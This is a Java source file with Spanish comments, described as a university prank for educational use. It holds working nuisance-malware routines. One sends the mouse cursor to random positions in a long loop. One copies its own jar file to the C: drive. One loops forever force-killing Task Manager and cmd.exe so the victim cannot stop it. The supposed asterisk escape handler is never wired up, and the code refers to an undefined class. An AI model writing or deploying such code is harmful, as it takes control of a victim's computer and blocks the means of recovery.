
import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 Esta clase contiene una serie de metodos que son algo molestos al usuario.
 Fueron creados como general, en bromas para la universidad, solo deben ser empleados con
 fines educativos.
 */

/**
 *
 * @author Kikeex
 */

class Comandos {


/*
Este metodo funciona para controlar el uso de ciertas teclas, en este caso
evitamos que el usuario pueda iniciar el administrador de tareas para poder detener
el proceso.
 */


public static void teclado(){

try
{
Robot robot = new Robot();
// abriendo el menu inicio
//robot.keyPress(KeyEvent.VK_WINDOWS);
//robot.keyRelease(KeyEvent.VK_WINDOWS);
// lanzando el explorerador
robot.keyPress(KeyEvent.VK_WINDOWS);
robot.keyPress(KeyEvent.VK_E);
robot.keyRelease(KeyEvent.VK_E);
}
catch (AWTException e)
{
e.printStackTrace();
}
}



/*
 Este metodo descontrola totalmente el cursor. El usuario no podrá hacer nada para moverlo.
 Puede ser modificado el tiempo dentro del ciclo.
 */


@SuppressWarnings("static-access")
public static void mouse() throws AWTException{
        Robot robot = new Robot();
	Random rnd = new Random();
        int x,y;
        for (int i = 0; i < 100000; i++) {
        	x = rnd.nextInt(1000);
                y = rnd.nextInt(1000);

                 robot.mouseMove(x, y);

//  Thread.currentThread().sleep(1000);//sleep for 1000 ms

//click derecho
//robot.mousePress(InputEvent.BUTTON2_MASK);
//robot.mouseRelease(InputEvent.BUTTON2_MASK);

try
  {
  Thread.sleep(10);

  }catch (InterruptedException ie)
  {
  System.out.println(ie.getMessage());
  }

}

}

public static void keyPressed(KeyEvent e){
if (e.getKeyCode() == e.VK_ASTERISK)
{

System.exit(0);
}
}


/*
 Este metodo puede ser un poco peligroso. Genera una autocopia del archivo en el disco local.
 */


public static void autoCopia ()
{
try
{


String file = "notocar.jar";
File inFile = new File (file);
File outFile = new File ("C:\\nombreConElQueSeCopiara.jar");

FileInputStream in = new FileInputStream (inFile);
FileOutputStream out = new FileOutputStream (outFile);
int Lilith;
while ((Lilith = in.read ()) != -1)
out.write (Lilith);

in.close ();
out.close ();
}
catch (IOException ex)
{
Logger.getLogger (frame1.class.getName ()).log (Level.SEVERE, null, ex);
}
}



/*
 Esta metodo está hecho para matar procesos. Si el usuario logra abrir el administrador de tareas
 este se cerrará.
 */

public static void task(){
boolean SinTask = false;
 while (SinTask == false)
{
try
{

Runtime.getRuntime ().exec ("cmd.exe /c taskkill /f /im taskmgr.exe");
Runtime.getRuntime ().exec ("cmd.exe /c taskkill /f /im cmd.exe");
Thread.sleep (1000);
}
catch (Exception e)
{
}


}
}
}



